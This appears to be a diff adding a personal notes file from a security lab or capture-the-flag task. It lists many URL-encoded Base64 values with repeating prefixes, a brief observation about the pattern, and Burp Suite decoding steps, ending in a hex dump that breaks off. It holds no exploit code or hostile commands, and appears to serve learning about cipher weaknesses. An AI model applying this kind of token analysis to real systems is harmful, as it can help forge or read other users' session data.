+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FBNzsTra8F%2Bmi7qWRO6zfJCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4%2FemDU2A%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKwQlWuFhWNFd5RPK3S0cluKnc%2FMYUJSqAUCPH5fQN9OFZ4xXc%2BzCj4cOT068bIBwpA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BPfNhxjk2Gax7Pp0JexEa6nfo7Rqr4LXQXE%2F%2BasFCOrR46xof4mGixsFQYRCbP%2B2g%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK81pnGzy%2B35fQ94hBt25TmK9%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK6e0iVv3%2B7cdwJs0F3OP1nhIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4cAkTY%2B%2F5El9pjNLtUL%2FSiaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BcK8LYOMnP0t5F31ZA2WUwpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK848iDAhb0DrFZmaUJsba%2FKsO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK0Yv7PiEtUMfbbjz2NZCjABBwJjEus3F7ZNXVk5RBd1%2BZNDcyGglNpKt%2FL03ltG%2Fig%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK45Zx8xvekI5J0i1MAFOEl9khpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4WBa0PpMiR%2FaXa2Q7AYyleJbekIhPhhCLFn%2BLSupddjkXIyBRSD5o5Fj9BmFnswow%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FVgVCR0ybBgMbX9o29oes%2BglSLzAc%2BdNqxwI%2FFllIxalznNkFIvp6hvlXc7Vvn4wA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySs2M2lH3f8HPRMsIjkeZVEIyoz05hCROrrjmgZ2GSBKWg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHUn1DdzOYxu8fEUpROgAodf1QRP0GPSb2u39zS0HImQ%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvGR25BlhnTh%2FRXcxIl8V%2FhYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvwTc7E62vBfpou6lkTus3yQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySsEJVrhYVjRXeUTyt0tHJbip3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvj3zYcY5Nhmsez6dCXsRGup36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvNaZxs8vt%2BX0PeIQbduU5ivfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuntIlb9%2Fu3HcCbNBdzj9Z4SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHAJE2Pv%2BRJfaYzS7VC%2F0omi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvnCvC2DjJz9LeRd9WQNllMKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvOPIgwIW9A6xWZmlCbG2vyrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStGL%2Bz4hLVDH22489jWQowAQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuOWcfMb3pCOSdItTABThJfZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuFgWtD6TIkf2l2tkOwGMpXiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv1YFQkdMmwYDG1%2FaNvaHrPoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+
+*THERE IS A PATTEREN THE FIRST FIFTY CHARACTERS OF EACH LINE ARE THE SAME*
+
+12*16*16*16
+
+*COPY FILE.TXT FROM TEXT EDITOR*
+*BURP SUITE*
+*TOGGLE DECODER*
+PASTE FILE.TXT
+*DECODE AS URL*
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKYsNYgsg1hFJebd+JNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ8EmoxKU1njKubmw7+RDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJLk0xdEarIh+MvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ+DZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d+oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93/Bz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo=
+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
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJKwQlWuFhWNFd5RPK3S0cluKnc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK+PfNhxjk2Gax7Pp0JexEa6nfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK81pnGzy+35fQ94hBt25TmK9+hBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK6e0iVv3+7cdwJs0F3OP1nhIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK4cAkTY+/5El9pjNLtUL/SiaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK+cK8LYOMnP0t5F31ZA2WUwpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK848iDAhb0DrFZmaUJsba/KsO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF+on86ew==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK0Yv7PiEtUMfbbjz2NZCjABBwJjEus3F7ZNXVk5RBd1+ZNDcyGglNpKt/L03ltG/ig==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK45Zx8xvekI5J0i1MAFOEl9khpVK6kb7k+mrhYRbT0vQ1/8rclRT/ClHAeUfXXwPjg==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK4WBa0PpMiR/aXa2Q7AYyleJbekIhPhhCLFn+LSupddjkXIyBRSD5o5Fj9BmFnswow==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/VgVCR0ybBgMbX9o29oes+glSLzAc+dNqxwI/FllIxalznNkFIvp6hvlXc7Vvn4wA==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxyStzil/7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySs2M2lH3f8HPRMsIjkeZVEIyoz05hCROrrjmgZ2GSBKWg==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySuHUn1DdzOYxu8fEUpROgAodf1QRP0GPSb2u39zS0HImQ==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvGR25BlhnTh/RXcxIl8V/hYiOhTZxCkbmHdbA/vHPU7diuUdfacbKwg9kZoNe4i5g=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvwTc7E62vBfpou6lkTus3yQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySsEJVrhYVjRXeUTyt0tHJbip3PzGFCUqgFAjx+X0DfThWeMV3Pswo+HDk9OvGyAcKQ=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvj3zYcY5Nhmsez6dCXsRGup36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvNaZxs8vt+X0PeIQbduU5ivfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySuntIlb9/u3HcCbNBdzj9Z4SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySuHAJE2Pv+RJfaYzS7VC/0omi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvnCvC2DjJz9LeRd9WQNllMKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvOPIgwIW9A6xWZmlCbG2vyrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxyStGL+z4hLVDH22489jWQowAQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySuOWcfMb3pCOSdItTABThJfZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySuFgWtD6TIkf2l2tkOwGMpXiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySv1YFQkdMmwYDG1/aNvaHrPoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySv2M+awX4ZiJrhjgXESsckrc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySv2M+awX4ZiJrhjgXESsckrNjNpR93/Bz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySv2M+awX4ZiJrhjgXESsckrh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt/c0tByJk=
+
+*DECODE AS BASE64*
+*DECODE TO HEX*
+1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 a3 77 c3 0a 0d 96 48 88 a1 b9 d4 53 5e a0 f8 d4 bd fa 10 54 ec 68 51 5c f9 6f 2a 55 44 59 19 47 90 4f 4b 2a bf 2c 2d 76 86 aa 72 a5 31 51 c9 70 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 98 b0 d6 20 b2 0d 61 14 97 9b 77 e2 4d 8b 1d 3a 48 79 9a 07 b1 d2 9b 59 82 01 5c 93 55 c2 e0 0e ad ed 9b db ac a6 a7 3b 71 b3 5a 01 0d 2c 4c 57 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 7c 12 6a 31 29 4d 67 8c ab 9b 9b 0e fe 44 3b 75 9a 2e 2b 5d b6 f3 1f 19 a1 4f 75 67 8e ad aa 90 42 49 b9 3e 4d ea 09 09 47 99 95 b9 c4 4b 35 1a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 b4 db dd 7c b1 03 54 69 d6 ac b2 f9 52 00 70 c7 29 28 7f 3c c5 47 9e 12 e6 6f 31 c8 63 b1 80 47 56 d5 73 2d c8 c7 70 f6 43 97 15 8b c1 7a 6e 66 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 4b 93 4c 5d 11 aa c8 87 e3 2f 4e 45 7a d5 39 6f ac 3b 87 1c 1c 44 83 86 b4 5c d3 6d 9e 8f 72 f4 65 51 49 bb ba 21 23 d8 9d 95 41 7e a2 7f 3a 7b 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 7e 0d 97 9d 48 94 2a c2 b6 57 f6 d7 d4 18 ce d6 41 c0 98 